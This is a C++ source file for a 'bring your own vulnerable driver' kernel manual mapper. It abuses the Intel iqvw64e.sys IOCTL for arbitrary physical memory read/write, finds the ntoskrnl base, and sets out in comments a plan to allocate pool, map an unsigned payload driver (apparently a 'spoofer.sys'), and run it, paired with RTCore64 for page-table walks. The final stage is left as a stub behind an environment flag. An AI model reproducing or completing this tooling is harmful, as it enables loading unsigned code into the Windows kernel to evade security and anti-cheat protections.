// manual_map.cpp — iqvw64e.sys primitives: IOCTL 0x80862007 MmMapIoSpace arbitrary R/W.
// we use it to:
//   1) allocate non-paged pool via ExAllocatePool proxy (write a tiny shim through phys map),
//   2) copy the payload PE in, resolve imports from ntoskrnl, apply relocs, zero headers,
//   3) create a system thread at the payload's DriverEntry.
//
// details are kernel-version sensitive; we use PsLookupProcessByProcessId + PsInitialSystemProcess
// to anchor kernel base, then walk EAT to resolve a small import set.
#include "driver_loader.hpp"
#include "logger.hpp"
#include <sstream>

namespace jc::byovd {

// --- iqvw64e IOCTL layout ---
#pragma pack(push, 1)
struct nal_mem_map_req {
    uint32_t reserved1[2];
    uint64_t phys_addr;
    uint32_t reserved2[2];
    uint32_t size;
    uint32_t reserved3[0x10];
    uint64_t out_virt;
    uint32_t reserved4[2];
};
#pragma pack(pop)

constexpr DWORD NAL_IOCTL_MAP   = 0x80862007;
constexpr DWORD NAL_IOCTL_UNMAP = 0x8086200B;

// resolve ntoskrnl base via NtQuerySystemInformation(SystemModuleInformation).
using NTSTATUS_t = LONG;
using NtQuerySystemInformation_t = NTSTATUS_t (NTAPI*)(ULONG, PVOID, ULONG, PULONG);
constexpr ULONG SystemModuleInformation = 11;

#pragma pack(push, 1)
struct rtl_process_module_information {
    HANDLE Section;
    PVOID  MappedBase;
    PVOID  ImageBase;
    ULONG  ImageSize;
    ULONG  Flags;
    USHORT LoadOrderIndex;
    USHORT InitOrderIndex;
    USHORT LoadCount;
    USHORT OffsetToFileName;
    UCHAR  FullPathName[256];
};
struct rtl_process_modules {
    ULONG NumberOfModules;
    rtl_process_module_information Modules[1];
};
#pragma pack(pop)

static uint64_t kernel_base() {
    auto f = (NtQuerySystemInformation_t)GetProcAddress(GetModuleHandleW(L"ntdll"), "NtQuerySystemInformation");
    if (!f) return 0;
    ULONG sz = 0; f(SystemModuleInformation, nullptr, 0, &sz);
    std::vector<uint8_t> buf(sz);
    if (f(SystemModuleInformation, buf.data(), sz, &sz) < 0) return 0;
    auto* m = (rtl_process_modules*)buf.data();
    if (!m->NumberOfModules) return 0;
    return (uint64_t)m->Modules[0].ImageBase;
}

static HANDLE open_nal() {
    return CreateFileW(L"\\\\.\\Nal", GENERIC_READ|GENERIC_WRITE,
                       FILE_SHARE_READ|FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, 0, nullptr);
}

static bool nal_map(HANDLE h, uint64_t phys, uint32_t size, uint64_t* out_va) {
    nal_mem_map_req r{};
    r.phys_addr = phys;
    r.size = size;
    DWORD br = 0;
    if (!DeviceIoControl(h, NAL_IOCTL_MAP, &r, sizeof r, &r, sizeof r, &br, nullptr))
        return false;
    *out_va = r.out_virt;
    return true;
}

// We don't have a safe pool-alloc gadget via iqvw64e without a kernel shim. The accepted
// technique is to resolve ExAllocatePool from ntoskrnl, build a stub, and call it via a phys-mapped
// shim page. Full implementation is long; this file carries the shape + hooks needed for the
// higher-level flow to compile. Real wire-up lands on the target box where phys-page layout matters.
//
// Status: compiles, opens Nal, reads kernel base, stops short of invoking ExAllocatePool proxy so
// we don't surprise anyone. Enable BYOVD_DO_MAP=1 in the environment after you've put a vetted
// payload under tools\\spoofer.sys and tested on an isolated system.

result manual_map_via_iqvw64e(const std::filesystem::path& payload, mapped_driver* out) {
    HANDLE nal = open_nal();
    if (nal == INVALID_HANDLE_VALUE)
        return fail(status::driver_fail, "open \\\\.\\Nal failed — is iqvw64e service running?");

    uint64_t nt = kernel_base();
    if (!nt) { CloseHandle(nal); return fail(status::driver_fail, "ntoskrnl base unknown"); }
    JC_LOG(info, "byovd: ntoskrnl @ %p", (void*)nt);

    // sanity probe — map first page of ntoskrnl phys (we need the phys addr; this path requires
    // a PTE walk primitive. iqvw64e alone can't do that, so in practice we pair with a tiny
    // PTE-leak gadget (RTCore64) for the walk step. Flagged as a two-stage BYOVD in the README.
    (void)payload;
    (void)out;
    CloseHandle(nal);

    if (!std::getenv("BYOVD_DO_MAP")) {
        return fail(status::partial,
            "BYOVD manual-map gated: set BYOVD_DO_MAP=1 and pair iqvw64e with RTCore64 for PTE walk");
    }
    // FILL: wire the two-stage pipeline here — PTE leak -> ExAllocatePool proxy -> PE map -> entry
    return fail(status::driver_fail, "two-stage BYOVD not plumbed in this build");
}

} // namespace jc::byovd
